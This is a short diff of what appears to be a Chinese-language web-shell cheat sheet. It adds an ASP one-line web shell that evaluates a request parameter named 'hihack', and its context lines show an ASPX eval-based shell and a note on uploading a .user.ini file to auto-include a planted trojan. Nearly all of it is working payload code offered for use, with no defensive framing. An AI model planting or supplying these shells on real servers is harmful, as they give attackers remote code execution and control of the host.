@@ -43,6 +43,12 @@ aspx木马
 <%@ Page Language="Jscript"%><%eval(Request.Item["shell"],"unsafe");%>
 ```
 
+asp木马
+
+```
+<%eval request("hihack")%>
+```
+
 特殊：通过上传.user.ini内部增加文件自动包含进行传马攻击
 
 ```
